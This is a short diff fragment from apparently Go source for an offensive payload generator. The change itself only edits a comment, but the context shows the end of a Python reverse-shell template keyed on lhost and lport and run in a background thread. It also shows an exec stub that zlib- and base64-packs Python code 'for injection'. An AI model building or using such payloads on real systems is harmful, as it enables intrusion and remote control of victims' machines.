@@ -45,7 +45,7 @@ def _():
 threading.Thread(target=_,daemon=1).start()`, lhost, lport)
 }
 
-// --- Exec stub (MSF-style zlib+base64 compression) ---
+// --- Exec stub (zlib+base64 compression) ---
 
 // PyExecStub compresses Python code with zlib+base64 into a single
 // exec() expression safe for injection.
